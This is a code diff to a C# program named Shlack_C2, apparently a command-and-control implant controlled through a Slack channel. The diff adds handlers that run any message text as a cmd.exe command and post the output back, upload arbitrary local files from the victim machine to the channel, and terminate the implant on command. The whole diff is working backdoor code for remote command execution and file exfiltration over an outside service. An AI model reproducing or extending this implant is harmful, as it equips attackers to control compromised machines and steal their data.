@@ -27,8 +27,31 @@ namespace Shlack_C2
                 // Handle each message as you receive them
                 if (message.bot_id == null && targetID == message.channel) //Only execute messages sent by users
                 {
-                    string output = Execute(message.text);
-                    client.PostMessage(null, message.channel.ToString(), output);
+                    switch (message.text.ToLower().Split(' ')[0])
+                    {
+                        case "exit": //Terminate the shell
+                            client.PostMessage(null, message.channel.ToString(), "Channel Terminated!");
+                            Environment.Exit(1);
+                            break;
+                        case "upload": //Upload local files to Slack channel
+                            string[] ch = new string[1];
+                            ch[0] = message.channel.ToString();
+                            try
+                            {
+                                string path = message.text.ToLower().Split(new[] { ' ' }, 2)[1];
+                                client.UploadFile(null, System.IO.File.ReadAllBytes(path), System.IO.Path.GetFileName(path), ch);
+                            }
+                            catch (Exception e)
+                            {
+                                client.PostMessage(null, message.channel.ToString(), e.Message);
+                            }
+                            break;
+
+                        default: //Execute commands inside cmd.exe
+                            string output = Execute(message.text);
+                            client.PostMessage(null, message.channel.ToString(), output);
+                            break;
+                    }
                 }
             };
             clientReady.Wait();
